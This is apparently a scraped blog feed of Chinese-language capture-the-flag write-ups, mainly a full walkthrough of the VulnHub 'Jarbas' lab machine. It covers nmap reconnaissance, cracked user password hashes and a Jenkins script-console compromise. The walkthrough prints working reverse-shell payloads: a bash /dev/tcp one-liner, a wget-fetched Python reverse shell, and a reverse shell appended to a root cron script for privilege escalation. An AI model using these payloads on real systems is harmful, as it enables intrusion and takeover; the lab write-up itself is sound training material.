<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kay</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>If you have found another user, what can you do with this information?</p>
</li>
<li>
<p>What is the final password you obtain?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">heresareallystrongpasswordthatfollowsthepasswordpolicy$$</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-jarbas</title>
    <url>/2024/03/13/VulnHub-jarbas/</url>
    <content><![CDATA[<h1>VulnHub-jarbas</h1>
<h2 id="信息搜集">信息搜集</h2>
<h3 id="主机发现">主机发现</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ifconfig </span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.152.131  netmask 255.255.255.0  broadcast 192.168.152.255</span><br><span class="line">        inet6 fe80::3021:1752:2678:7550  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:82:4e:1f  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 75  bytes 15383 (15.0 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 36  bytes 10986 (10.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 4  bytes 240 (240.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 4  bytes 240 (240.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>查看本机ip，扫描同一网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sn 192.168.152.0/24    </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:14 EDT</span><br><span class="line">Nmap scan report for 192.168.152.1</span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.2</span><br><span class="line">Host is up (0.000089s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:F0:8A (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.133</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line">MAC Address: 00:0C:29:CD:D8:CF (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.254</span><br><span class="line">Host is up (0.00017s latency).</span><br><span class="line">MAC Address: 00:50:56:F9:E8:79 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds</span><br></pre></td></tr></table></figure>
<p>经过上下线确认是靶机ip是192.168.152.133</p>
<h3 id="端口扫描">端口扫描</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap --min-rate 10000 -p- 192.168.152.133</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:20 EDT</span><br><span class="line">Nmap scan report for 192.168.152.133</span><br><span class="line">Host is up (0.000099s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">MAC Address: 00:0C:29:CD:D8:CF (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="详细信息搜集">详细信息搜集</h3>
<h4 id="TCP扫描">TCP扫描</h4>
<p>基础端口开了22，80，3306，8080，基本就是正常的服务，开始进行下一步更详细的信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.152.133</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:23 EDT</span><br><span class="line">Nmap scan report for 192.168.152.133</span><br><span class="line">Host is up (0.00035s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">3306/tcp open  mysql   MariaDB (unauthorized)</span><br><span class="line">8080/tcp open  http    Jetty 9.4.z-SNAPSHOT</span><br><span class="line">MAC Address: 00:0C:29:CD:D8:CF (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.80 seconds</span><br></pre></td></tr></table></figure>
<p>拿到了一些版本的信息和操作系统的信息，再尝试udp</p>
<h4 id="UDP扫描">UDP扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap -sU -p22,80,3306,8080 192.168.152.133</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:27 EDT</span><br><span class="line">Nmap scan report for 192.168.152.133</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/udp   closed ssh</span><br><span class="line">80/udp   closed http</span><br><span class="line">3306/udp closed mysql</span><br><span class="line">8080/udp closed http-alt</span><br><span class="line">MAC Address: 00:0C:29:CD:D8:CF (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>udp协议全部是关着的，无有效信息，开始尝试脚本扫描</p>
<h4 id="vuln脚本扫描">vuln脚本扫描</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,80,3306,8080 192.168.152.133</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 22:28 EDT</span><br><span class="line">Nmap scan report for 192.168.152.133</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-trace: TRACE is enabled</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /icons/: Potentially interesting folder w/ directory listing</span><br><span class="line">| http-sql-injection: </span><br><span class="line">|   Possible sqli for queries:</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=D%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/?C=N%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=S%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=M%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|     http://192.168.152.133:80/index_arquivos/njarb_data/?C=N%3BO%3DD%27%20OR%20sqlspider</span><br><span class="line">|_    http://192.168.152.133:80/index_arquivos/njarb_data/?C=D%3BO%3DA%27%20OR%20sqlspider</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">| http-csrf: </span><br><span class="line">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.152.133</span><br><span class="line">|   Found the following possible CSRF vulnerabilities: </span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.152.133:80/</span><br><span class="line">|     Form id: wmtb</span><br><span class="line">|     Form action: /web/submit</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.152.133:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|     Form action: /web/20020720170457/http://jarbas.com.br:80/user.php</span><br><span class="line">|     </span><br><span class="line">|     Path: http://192.168.152.133:80/</span><br><span class="line">|     Form id: </span><br><span class="line">|_    Form action: /web/20020720170457/http://jarbas.com.br:80/busca/</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /robots.txt: Robots file</span><br><span class="line">MAC Address: 00:0C:29:CD:D8:CF (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 37.80 seconds</span><br></pre></td></tr></table></figure>
<p>通过脚本扫描的信息，可以看到明显是需要以80端口，也就是我们常规的web服务去做主要的突破口，</p>
<p><strong>注意</strong></p>
<p>记得随时将自己的信息整理记录，以防在下一步找不到突破口的时候，可以及时返回查询。或者是防备自己在扫描过程中有所遗漏。</p>
<h3 id="目录爆破">目录爆破</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ dirsearch -u 192.168.152.133        </span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.3</span><br><span class="line"> (_||| _) (/_(_|| (_| )</span><br><span class="line"></span><br><span class="line">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460</span><br><span class="line"></span><br><span class="line">Output File: /home/kali/桌面/reports/_192.168.152.133/_24-03-12_22-43-47.txt</span><br><span class="line"></span><br><span class="line">Target: http://192.168.152.133/</span><br><span class="line"></span><br><span class="line">[22:43:47] Starting: </span><br><span class="line">[22:43:49] 403 -  213B  - /.ht_wsr.txt                                      </span><br><span class="line">[22:43:49] 403 -  216B  - /.htaccess.bak1                                   </span><br><span class="line">[22:43:49] 403 -  216B  - /.htaccess.orig                                   </span><br><span class="line">[22:43:49] 403 -  216B  - /.htaccess.save</span><br><span class="line">[22:43:49] 403 -  217B  - /.htaccess_extra                                  </span><br><span class="line">[22:43:49] 403 -  214B  - /.htaccess_sc</span><br><span class="line">[22:43:49] 403 -  214B  - /.htaccessOLD</span><br><span class="line">[22:43:49] 403 -  214B  - /.htaccessBAK</span><br><span class="line">[22:43:49] 403 -  215B  - /.htaccessOLD2</span><br><span class="line">[22:43:49] 403 -  216B  - /.htaccess_orig</span><br><span class="line">[22:43:49] 403 -  207B  - /.html                                            </span><br><span class="line">[22:43:49] 403 -  218B  - /.htaccess.sample</span><br><span class="line">[22:43:49] 403 -  206B  - /.htm                                             </span><br><span class="line">[22:43:49] 403 -  216B  - /.htpasswd_test</span><br><span class="line">[22:43:49] 403 -  213B  - /.httr-oauth</span><br><span class="line">[22:43:49] 403 -  212B  - /.htpasswds</span><br><span class="line">[22:43:53] 200 -  359B  - /access.html                                      </span><br><span class="line">[22:44:00] 403 -  210B  - /cgi-bin/                                         </span><br><span class="line">                                                                             </span><br><span class="line">Task Completed    </span><br></pre></td></tr></table></figure>
<p>仅发现有一个access.html是开放的</p>
<h2 id="Web渗透">Web渗透</h2>
<p>查看80端口是一个Jarbas服务</p>
<p><img src="https://s2.loli.net/2024/03/13/2gxJDRXP3V4KYsW.png" alt="vulnhub-jarbas-1"></p>
<p>查看8080端口</p>
<p><img src="https://s2.loli.net/2024/03/13/ID6fcVFHhSTXUol.png" alt="vulnhub-jarbas-2"></p>
<p>同时在之前的扫描过程中，其实还存在一个robots.txt，存在以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># we don&#x27;t want robots to click &quot;build&quot; links</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
<p>在目录扫描的过程中，发现存在以下页面</p>
<p><img src="https://s2.loli.net/2024/03/13/dKJ1lafuNLXStEi.png" alt="vulnhub-jarbas-3"></p>
<p>将信息进行保留</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:5978a63b4654c73c60fa24f836386d87</span><br><span class="line">trindade:f463f63616cb3f1e81ce46b39f882fd5</span><br><span class="line">eder:9b38e2b1e8b12f426b0d208a7ab6cb98</span><br></pre></td></tr></table></figure>
<p>将上述的信息进行查询</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tiago:italia99</span><br><span class="line">trindade:marianna</span><br><span class="line">eder:vipsu</span><br></pre></td></tr></table></figure>
<p>使用<code>eder:vipsu</code>成功登录，另外两个账户均显示登录无效，来到了Jenkins的后台界面。</p>
<p>通过我本地存储的一些漏洞库，可以看到该系统还是有不少利用点的，挨个尝试。</p>
<p><img src="https://s2.loli.net/2024/03/13/36JzyKR2BQToiSb.png" alt="vulnhub-jarbas-4"></p>
<p>”系统管理”功能，脚本命令行的远程命令执行漏洞直接利用成功。</p>
<p><img src="https://s2.loli.net/2024/03/13/3pZVEsWO2bjQX6l.png" alt="vulnhub-jarbas-5"></p>
<p>简单看了一下其他两个漏洞，但是估计连命令行这个都没修复，其他两个应该也都能能打通，暂时没去尝试。</p>
<p>开始尝试反弹shell，先开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 1234   </span><br></pre></td></tr></table></figure>
<p>然后尝试执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/192.168.152.132/1234 &lt;&amp;1&#x27;&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p>直接进行反弹shell命令的执行，攻击机kali并没有接受到反弹shell，除了bash，也尝试过了netcat的，都失败了</p>
<p>在经过网上查询后，尝试另一种思路，先在本机开启一个web服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
<p><a href="http://xn--shell-fg1hyj192b82x3kpd23a.py">然后新建一个shell.py</a>，更换ip和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"># This is a Python reverse shell script</span><br><span class="line"></span><br><span class="line">import socket,subprocess,os;</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span><br><span class="line">s.connect((&quot;192.168.152.131&quot;,1234));</span><br><span class="line">os.dup2(s.fileno(),0);</span><br><span class="line">os.dup2(s.fileno(),1);</span><br><span class="line">os.dup2(s.fileno(),2);</span><br><span class="line">p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
<p>开始执行命令，<a href="http://xn--wegtshell-3b6nf67a7veg11lubrd.py">利用wegt去下载shell.py</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;wget http://192.168.152.131/shell.py -P /tmp/&quot;.execute().text</span><br></pre></td></tr></table></figure>
<p>此时暂时无回显，再次输入命令执行，不太确定是python3还是python成功执行反弹了shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">println &quot;python3 /tmp/shell.py&quot;.execute().text</span><br><span class="line">println &quot;python /tmp/shell.py&quot;.execute().text</span><br></pre></td></tr></table></figure>
<h2 id="提权">提权</h2>
<p>拿到一个用户后，先进行枚举，确认自身状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh-4.2$ whoami</span><br><span class="line">whoami</span><br><span class="line">jenkins</span><br><span class="line">sh-4.2$ uname -a</span><br><span class="line">uname -a</span><br><span class="line">Linux jarbas 3.10.0-693.21.1.el7.x86_64 #1 SMP Wed Mar 7 19:03:37 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line">sh-4.2$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line"></span><br><span class="line">We trust you have received the usual lecture from the local System</span><br><span class="line">Administrator. It usually boils down to these three things:</span><br><span class="line"></span><br><span class="line">    #1) Respect the privacy of others.</span><br><span class="line">    #2) Think before you type.</span><br><span class="line">    #3) With great power comes great responsibility.</span><br><span class="line"></span><br><span class="line">sudo: no tty present and no askpass program specified</span><br></pre></td></tr></table></figure>
<p>因为知道靶机上存在python，所以再提升一下交互性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<p>继续枚举，先前的sudo和用户信息都无有效信息可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-4.2$ cd etc</span><br><span class="line">cd etc</span><br><span class="line">bash-4.2$ ls</span><br><span class="line">ls</span><br><span class="line">adjtime                  inittab                   profile.d</span><br><span class="line">aliases                  inputrc                   protocols</span><br><span class="line">aliases.db               iproute2                  python</span><br><span class="line">alternatives             issue                     rc0.d</span><br><span class="line">anacrontab               issue.net                 rc1.d</span><br><span class="line">asound.conf              java                      rc2.d</span><br><span class="line">audisp                   jvm                       rc3.d</span><br><span class="line">audit                    jvm-commmon               rc4.d</span><br><span class="line">bash_completion.d        kdump.conf                rc5.d</span><br><span class="line">bashrc                   kernel                    rc6.d</span><br><span class="line">binfmt.d                 krb5.conf                 rc.d</span><br><span class="line">centos-release           krb5.conf.d               rc.local</span><br><span class="line">centos-release-upstream  ld.so.cache               redhat-release</span><br><span class="line">chkconfig.d              ld.so.conf                resolv.conf</span><br><span class="line">chrony.conf              ld.so.conf.d              rpc</span><br><span class="line">chrony.keys              libaudit.conf             rpm</span><br><span class="line">cron.d                   libnl                     rsyslog.conf</span><br><span class="line">cron.daily               libuser.conf              rsyslog.d</span><br><span class="line">cron.deny                locale.conf               rwtab</span><br><span class="line">cron.hourly              localtime                 rwtab.d</span><br><span class="line">cron.monthly             login.defs                sasl2</span><br><span class="line">crontab                  logrotate.conf            script</span><br><span class="line">cron.weekly              logrotate.d               securetty</span><br><span class="line">crypttab                 lvm                       security</span><br><span class="line">csh.cshrc                machine-id                selinux</span><br><span class="line">csh.login                magic                     services</span><br><span class="line">dbus-1                   mailcap                   sestatus.conf</span><br><span class="line">default                  makedumpfile.conf.sample  shadow</span><br><span class="line">depmod.d                 man_db.conf               shadow-</span><br><span class="line">dhcp                     maven                     shells</span><br><span class="line">DIR_COLORS               mime.types                skel</span><br><span class="line">DIR_COLORS.256color      mke2fs.conf               ssh</span><br><span class="line">DIR_COLORS.lightbgcolor  modprobe.d                ssl</span><br><span class="line">dracut.conf              modules-load.d            statetab</span><br><span class="line">dracut.conf.d            motd                      statetab.d</span><br><span class="line">e2fsck.conf              mtab                      subgid</span><br><span class="line">environment              my.cnf                    subuid</span><br><span class="line">ethertypes               my.cnf.d                  sudo.conf</span><br><span class="line">exports                  nanorc                    sudoers</span><br><span class="line">favicon.png              NetworkManager            sudoers.d</span><br><span class="line">filesystems              networks                  sudo-ldap.conf</span><br><span class="line">firewalld                nsswitch.conf             sysconfig</span><br><span class="line">fonts                    nsswitch.conf.bak         sysctl.conf</span><br><span class="line">fstab                    openldap                  sysctl.d</span><br><span class="line">gcrypt                   opt                       systemd</span><br><span class="line">GeoIP.conf               os-release                system-release</span><br><span class="line">GeoIP.conf.default       pam.d                     system-release-cpe</span><br><span class="line">gnupg                    passwd                    terminfo</span><br><span class="line">GREP_COLORS              passwd-                   tmpfiles.d</span><br><span class="line">groff                    php.d                     tuned</span><br><span class="line">group                    php-fpm.conf              udev</span><br><span class="line">group-                   php-fpm.d                 vconsole.conf</span><br><span class="line">grub2.cfg                php.ini                   vimrc</span><br><span class="line">grub.d                   pkcs11                    virc</span><br><span class="line">gshadow                  pki                       wgetrc</span><br><span class="line">gshadow-                 plymouth                  wpa_supplicant</span><br><span class="line">gss                      pm                        X11</span><br><span class="line">host.conf                polkit-1                  xdg</span><br><span class="line">hostname                 popt.d                    xinetd.d</span><br><span class="line">hosts                    postfix                   yum</span><br><span class="line">hosts.allow              ppp                       yum.conf</span><br><span class="line">hosts.deny               prelink.conf.d            yum.repos.d</span><br><span class="line">httpd                    printcap</span><br><span class="line">init.d                   profile</span><br></pre></td></tr></table></figure>
<p>在crontab中发现存在使用root权限去运行的脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-4.2$ cat crontab                                  </span><br><span class="line">cat crontab</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">MAILTO=root</span><br><span class="line"></span><br><span class="line"># For details see man 4 crontabs</span><br><span class="line"></span><br><span class="line"># Example of job definition:</span><br><span class="line"># .---------------- minute (0 - 59)</span><br><span class="line"># |  .------------- hour (0 - 23)</span><br><span class="line"># |  |  .---------- day of month (1 - 31)</span><br><span class="line"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="line"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="line"># |  |  |  |  |</span><br><span class="line"># *  *  *  *  * user-name  command to be executed</span><br><span class="line">*/5 * * * * root /etc/script/CleaningScript.sh &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>查看脚本的详细内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-4.2$ cat ./script/CleaningScript.sh</span><br><span class="line">cat ./script/CleaningScript.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">rm -rf /var/log/httpd/access_log.txt</span><br></pre></td></tr></table></figure>
<p>就是一条定时清理访问日志的shell脚本，但是给予了root那么高的权限，就可以尝试去利用。</p>
<p>先开启新的监听端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lnvp 3333</span><br></pre></td></tr></table></figure>
<p>向脚本中写入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.152.131/3333 0&gt;&amp;1&quot; &gt;&gt; /etc/script/CleaningScript.sh</span><br></pre></td></tr></table></figure>
<p>再次查看脚本，确认命令正确写入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash-4.2$ cat ./script/CleaningScript.sh</span><br><span class="line">cat ./script/CleaningScript.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">rm -rf /var/log/httpd/access_log.txt</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.152.131/3333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>确认无误，等待命令自动执行，成功反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@jarbas ~]# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">[root@jarbas ~]# ip a</span><br><span class="line">ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN qlen 1</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens33: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP qlen 1000</span><br><span class="line">    link/ether 00:0c:29:cd:d8:cf brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.152.133/24 brd 192.168.152.255 scope global dynamic ens33</span><br><span class="line">       valid_lft 1421sec preferred_lft 1421sec</span><br><span class="line">    inet6 fe80::9114:a460:aa3:9dd5/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
<p>确认权限和ip正确</p>
<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@jarbas ~]# cat flag.txt</span><br><span class="line">cat flag.txt</span><br><span class="line">Hey!</span><br><span class="line"></span><br><span class="line">Congratulations! You got it! I always knew you could do it!</span><br><span class="line">This challenge was very easy, huh? =)</span><br><span class="line"></span><br><span class="line">Thanks for appreciating this machine.</span><br><span class="line"></span><br><span class="line">@tiagotvrs </span><br></pre></td></tr></table></figure>
<h2 id="总结">总结</h2>
<p>目前虽然还处于初步学习的过程，比上一台相比，对于信息搜集更加熟练，对问题信息也更加敏感，需要注意的是对于部分常用遇到的系统需要更加规范的去进行整理，比如这次遇到的jenkins，很多可利用的点可以挨个尝试，红笔师傅使用的是新建项目的命令行执行，进行反弹shell的操作，而我使用的是命令行的执行漏洞，略有不同，以后可多加尝试。暂时需要的是极大的增加学习的广度，与知识面。</p>
]]></content>
      <categories>
        <category>VulnHub</category>
      </categories>
      <tags>
        <tag>VulnHub</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-SickOS1.1</title>
    <url>/2024/03/20/VulnHub-SickOS1.1/</url>
    <content><![CDATA[<h1>VulnHub-SickOS1.1</h1>
<h2 id="信息搜集">信息搜集</h2>
<h3 id="主机发现">主机发现</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sn 192.168.152.0/24    </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:35 EDT</span><br><span class="line">Nmap scan report for 192.168.152.1</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:08 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.2</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 00:50:56:FB:F0:8A (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.135</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 00:0C:29:E9:D0:28 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.254</span><br><span class="line">Host is up (0.00033s latency).</span><br><span class="line">MAC Address: 00:50:56:E3:37:B1 (VMware)</span><br><span class="line">Nmap scan report for 192.168.152.131</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.99 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="端口扫描">端口扫描</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --min-rate 10000 -p- 192.168.152.135</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-14 02:36 EDT</span><br><span class="line">Nmap scan report for 192.168.152.135</span><br><span class="line">Host is up (0.00032s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">22/tcp   open   ssh</span><br><span class="line">3128/tcp open   squid-http</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">MAC Address: 00:0C:29:E9:D0:28 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.40 seconds</span><br><span class="line">                                                                  </span><br></pre></td></tr></table></figure>
<p>发现开放端口仅存在两个，也就是22和3128，8080端口是关闭的，不可访问</p>
<h3 id="详细信息搜集">详细信息搜集</h3>
<h4 id="TCP扫描">TCP扫描</h4>
